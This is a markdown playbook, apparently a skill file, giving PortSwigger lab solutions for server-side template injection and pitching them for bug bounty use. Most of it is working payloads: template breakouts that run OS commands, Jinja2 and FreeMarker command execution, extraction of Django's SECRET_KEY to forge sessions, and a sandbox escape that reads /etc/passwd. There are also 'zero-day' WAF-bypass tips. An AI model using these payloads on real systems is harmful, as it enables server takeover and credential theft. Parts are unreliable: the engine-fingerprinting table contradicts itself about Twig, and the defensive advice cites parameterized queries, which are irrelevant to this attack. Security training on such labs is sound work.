---
name: "Server-Side Template Injection — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1190"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# Server-Side Template Injection — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Basic SSTI 🟡 PRACTITIONER
```
{{7*7}}
```
If output = `49` → template injection confirmed. Identify engine:
- `{{7*'7'}}` → `7777777` = Jinja2/Twig
- `{{7*'7'}}` → `49` = Twig
- `${7*7}` → FreeMarker
- `<%= 7*7 %>` → ERB (Ruby)
---

### Lab 2: Basic SSTI code context 🟡 PRACTITIONER
```
blog-post-author-display=user.name}}{%import+os%}{{os.popen('whoami').read()}}
```
Break out of expression context, import os module, execute command.
---

### Lab 3: SSTI using documentation 🟡 PRACTITIONER
Read the template engine docs to find dangerous methods:
- Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- FreeMarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
---

### Lab 4: Unknown language documented exploit 🟡 PRACTITIONER
```
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{this}}
  {{/with}}
{{/with}}
```
Identify as Handlebars, then use documented RCE gadget.
---

### Lab 5: Info disclosure via user objects 🟡 PRACTITIONER
```
{{settings.SECRET_KEY}}
```
Django: access settings object → extract SECRET_KEY → forge session cookie → admin access.
---

### Lab 6: Sandboxed environment 🔴 EXPERT
Bypass Jinja2 sandbox:
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```
Walk the MRO chain to find `file` class or `subprocess.Popen`.
---

### Lab 7: Custom exploit 🔴 EXPERT
Requires building a custom gadget chain. Analyze available objects via `{{self.__class__.__mro__}}` and find a path to code execution through the object graph.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
